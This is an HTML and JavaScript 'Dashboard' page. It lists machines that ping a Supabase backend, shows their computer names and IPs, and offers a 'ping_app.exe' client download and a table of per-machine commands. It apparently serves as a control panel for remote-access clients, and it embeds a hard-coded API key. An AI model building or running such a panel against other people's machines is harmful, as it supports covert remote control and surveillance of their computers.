<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',sans-serif;min-height:100vh}
.topbar{background:#161b22;border-bottom:1px solid #30363d;padding:.8rem 2rem;display:flex;align-items:center;justify-content:space-between}
.topbar h1{color:#58a6ff;font-size:1.1rem}
.topbar .right{display:flex;gap:.5rem;align-items:center}
.btn{border:none;padding:.45rem 1rem;border-radius:6px;cursor:pointer;font-size:.85rem;font-weight:600}
.btn-green{background:#238636;color:#fff}.btn-green:hover{background:#2ea043}
.btn-blue{background:#1f6feb;color:#fff}.btn-blue:hover{background:#388bfd}
.btn-red{background:#da3633;color:#fff}.btn-red:hover{background:#f85149}
.btn-gray{background:#21262d;color:#c9d1d9;border:1px solid #30363d}.btn-gray:hover{background:#30363d}
.main{padding:1.5rem 2rem}
.stats{display:flex;gap:1rem;margin-bottom:1.5rem}
.stat{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:.8rem 1.2rem;min-width:130px}
.stat .num{font-size:1.6rem;font-weight:bold;color:#58a6ff}
.stat .lbl{color:#8b949e;font-size:.75rem;margin-top:.1rem}
.client{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:.8rem 1.2rem;margin-bottom:.5rem;display:flex;align-items:center;gap:1rem}
    .client .dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
    .client .dot.online{background:#3fb950}
    .client .dot.offline{background:#484f58}
.client .info{flex:1}
.client .name{font-weight:700;color:#f0f6fc}
.client .meta{color:#8b949e;font-size:.8rem}
.client .actions{display:flex;gap:.4rem}
.empty{color:#484f58;text-align:center;padding:3rem;font-size:1rem}
@keyframes fade{from{opacity:0;transform:translateY(-5px)}to{opacity:1;transform:translateY(0)}}
.client{animation:fade .3s ease}
</style>
</head>
<body>
<div class="topbar">
  <h1>Dashboard</h1>
  <div class="right">
    <button class="btn btn-gray" onclick="load()">Refresh</button>
    <button class="btn btn-green" onclick="downloadClient()">Download Client</button>
  </div>
</div>
<div class="main">
  <div class="stats">
    <div class="stat"><div class="num" id="count">0</div><div class="lbl">Total Pings</div></div>
    <div class="stat"><div class="num" id="clients">0</div><div class="lbl">Online</div></div>
    <div class="stat"><div class="num" id="last">-</div><div class="lbl">Last Ping</div></div>
  </div>
  <div id="list"><div class="empty">No clients yet</div></div>
</div>
<script>
const SB='https://odocuexiouhmmkpwtuwk.supabase.co';
const KEY='sb_publishable_KWdi4nin2RNI9pl3T2LiAA_-6axXMED';
const H={headers:{apikey:KEY,Authorization:'Bearer '+KEY}};
const PH={headers:{apikey:KEY,Authorization:'Bearer '+KEY,'Content-Type':'application/json'}};
let latest={};

async function load(){
  try{
    const r=await fetch(SB+'/rest/v1/pings?order=id.desc&limit=100',H);
    const p=await r.json();
    if(!Array.isArray(p))return;
    document.getElementById('count').textContent=p.length;
    latest={};
    p.forEach(x=>{if(!latest[x.computer])latest[x.computer]=x});
    const names=Object.keys(latest);
    document.getElementById('clients').textContent=names.length;
    if(p.length)document.getElementById('last').textContent=new Date(p[0].created_at).toLocaleTimeString();
    const list=document.getElementById('list');
    if(!names.length){list.innerHTML='<div class="empty">No clients yet</div>';return}
    list.innerHTML=names.map(n=>{
      const x=latest[n];
      const age=Date.now()-new Date(x.created_at).getTime();
      const online=age<30000;
      return '<div class="client"><div class="dot '+(online?'online':'offline')+'"></div><div class="info"><div class="name">'+esc(n||'unknown')+'</div><div class="meta">IP: '+esc(x.ip||'?')+' | '+new Date(x.created_at).toLocaleString()+(online?' <span style="color:#3fb950">● Online</span>':' <span style="color:#484f58">● Offline</span>')+'</div></div><div class="actions"><button class="btn btn-blue" onclick="openClient(\''+n+'\')">Open</button><button class="btn btn-red" onclick="removeClient(\''+n+'\')">Remove</button></div></div>';
    }).join('');
  }catch{}
}

function esc(t){const d=document.createElement('div');d.textContent=t;return d.innerHTML}

function openClient(name){
  window.open('client.html?name='+encodeURIComponent(name),'_blank');
}
function downloadClient(){
  window.location.href='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe';
}

async function removeClient(name){
  if(!confirm('Remove '+name+'?'))return;
  try{
    await fetch(SB+'/rest/v1/pings?computer=eq.'+encodeURIComponent(name),{method:'DELETE',headers:PH});
    await fetch(SB+'/rest/v1/commands?computer=eq.'+encodeURIComponent(name),{method:'DELETE',headers:PH});
    await load();
  }catch{}
}

load();
</script>
</body>
</html>
